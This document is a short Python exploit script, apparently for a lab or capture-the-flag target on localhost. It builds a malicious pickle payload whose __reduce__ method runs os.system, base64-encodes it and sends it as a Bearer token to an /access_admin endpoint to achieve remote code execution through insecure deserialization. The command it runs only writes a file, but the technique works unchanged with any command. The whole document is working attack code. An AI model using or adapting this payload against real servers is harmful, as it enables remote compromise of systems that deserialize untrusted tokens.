import pickle
import base64
import os
import requests

# We are targetting the backend server specifically
TARGET_URL = 'http://localhost:5000/access_admin'

class RCE_Exploit(object):
    # Tells pickle to not just load but run this function
    def __reduce__(self):
        # command to execute on the server
        cmd = 'echo "Nice Couch :)" > /app/unwelcome_guest.txt'
        # what to run
        return (os.system, (cmd,))

def main():
    print('Generating pickle payload')
    # create the class as a payload
    payload = pickle.dumps(RCE_Exploit())
    # encode it to look like what the server expects
    payload_token = base64.b64encode(payload).decode('utf-8')

    # we make the headers that the server expects
    headers = {
        'Authorization' : f'Bearer {payload_token}'
    }

    print(f'Sending payload.')
    # send the payload
    try:
        requests.get(TARGET_URL, headers=headers)
    except Exception as e:
        print(f'Error sending payload: {e}')
    print(f'Payload sent.')

if __name__ == '__main__':
    main()